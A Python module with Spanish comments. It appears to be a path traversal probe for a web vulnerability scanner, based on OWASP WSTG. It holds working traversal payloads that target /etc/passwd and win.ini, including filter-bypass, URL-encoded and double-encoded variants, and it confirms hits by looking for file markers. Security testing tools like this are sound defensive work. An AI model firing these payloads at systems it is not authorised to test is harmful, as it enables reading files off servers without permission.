"""
Sonda Path Traversal — OWASP WSTG-ATHZ-01 (Testing Directory Traversal
/ File Include).

Tercera sonda propia, escrita desde cero a partir de la metodología
pública OWASP WSTG (sin mirar wstg-scan). Se inyectan varias
secuencias de retroceso de directorio — incluida alguna variante
pensada para esquivar un filtro ingenuo que solo quita "../" una vez
("....//" se queda en "../" tras una sola pasada de str.replace) y
rutas absolutas directas (algunas construcciones de ruta, p.ej.
os.path.join en Python, descartan silenciosamente la base si el input
ya es una ruta absoluta) — apuntando a un fichero del sistema bien
conocido, y se comprueba si su contenido característico aparece en la
respuesta. Mismo patrón de confirmación que recoge la plantilla de
referencia de rule_classifier.py de PocketHacker: "confirmado con
lectura real de un fichero del sistema".

No se prueba con null byte (%00): las versiones modernas de PHP
(>= 5.3.4) y prácticamente cualquier runtime actual ya no son
vulnerables a ese truco — incluirlo solo añadiría ruido sin ganar
cobertura real.
"""

import httpx

TIMEOUT = 10

# (nombre, payload, marcador esperado en la respuesta)
PAYLOADS = [
    ("Linux, retroceso simple", "../../../../../../etc/passwd", "root:x:0:0:"),
    ("Linux, ruta absoluta directa", "/etc/passwd", "root:x:0:0:"),
    (
        "Linux, bypass de filtro ingenuo (../ repetido)",
        "....//....//....//....//....//....//etc/passwd",
        "root:x:0:0:",
    ),
    (
        "Linux, codificado en URL",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
        "root:x:0:0:",
    ),
    (
        "Linux, doble codificado en URL",
        "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
        "root:x:0:0:",
    ),
    (
        "Windows, retroceso simple",
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "[fonts]",
    ),
    (
        "Windows, con barras normales",
        "../../../../../../windows/win.ini",
        "[fonts]",
    ),
]


def _send(client: httpx.Client, point: dict, value: str) -> str:
    params = dict(point.get("params", {}))
    params[point["param"]] = value
    if point["method"] == "GET":
        resp = client.get(point["url"], params=params, timeout=TIMEOUT)
    else:
        resp = client.post(point["url"], data=params, timeout=TIMEOUT)
    return resp.text


def _test_point(client: httpx.Client, point: dict) -> dict | None:
    for nombre, payload, marcador in PAYLOADS:
        try:
            body = _send(client, point, payload)
        except httpx.HTTPError:
            continue
        if marcador in body and payload not in body:
            return {
                "name": "PATH_TRAVERSAL",
                "detail": (
                    f"{point['method']} {point['url']} — el parámetro '{point['param']}' "
                    f"huele a Path Traversal: al meter una ruta con retrocesos de "
                    f"directorio ({nombre}), apareció en la respuesta lo que parece "
                    f"contenido de un fichero del sistema que no debería ser accesible. "
                    f"Por ahí podría colarse acceso a ficheros fuera del directorio "
                    f"esperado — vale la pena explorar qué más se puede leer."
                ),
                "severity": "high",
            }
    return None


def run(injection_points: list[dict]) -> list[dict]:
    """Devuelve una lista de hallazgos (uno por punto de inyección
    donde se detecta path traversal), con el mismo convenio que el
    resto de módulos: {"name", "detail", "severity"}. El timeout lo
    controla dojohack.timeouts.run_module, no esta función."""
    findings = []
    with httpx.Client(follow_redirects=True) as client:
        for point in injection_points:
            result = _test_point(client, point)
            if result:
                findings.append(result)
    return findings
